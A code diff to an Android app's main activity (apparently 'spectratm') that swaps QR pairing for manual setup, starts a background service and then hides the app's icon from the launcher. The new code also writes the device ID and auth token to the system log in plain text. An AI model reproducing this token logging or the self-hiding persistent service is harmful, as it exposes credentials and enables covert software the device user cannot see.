@@ -15,24 +15,23 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // Check if we need to show QR scanner or start service
+        // Check if we have pairing data
         val prefs = getSharedPreferences("spectratm_config", Context.MODE_PRIVATE)
-        val hasToken = prefs.getString("device_token", null) != null
+        val deviceId = prefs.getString("device_id", null)
+        val token = prefs.getString("device_token", null)
         
-        if (!hasToken && intent?.getBooleanExtra("show_qr_scanner", false) == true) {
-            Log.d(TAG, "Starting QR Scanner for initial setup")
-            // Show QR scanner for first-time setup
-            val qrIntent = Intent(this, QRScannerActivity::class.java)
-            startActivity(qrIntent)
+        if (deviceId == null || token == null) {
+            Log.d(TAG, "No pairing data found - starting manual setup")
+            // Show manual setup for first-time configuration
+            val setupIntent = Intent(this, ManualSetupActivity::class.java)
+            startActivity(setupIntent)
         } else {
-            Log.d(TAG, "Starting CoreService")
-            // Start service normally
+            Log.d(TAG, "Found pairing data: $deviceId / $token - starting CoreService")
+            // Start service with existing pairing
             val serviceIntent = Intent(this, CoreService::class.java)
             startForegroundService(serviceIntent)
-        }
-        
-        // Remove icon from launcher after first run
-        if (hasToken) {
+            
+            // Hide from launcher after successful pairing
             hideFromLauncher()
         }
         
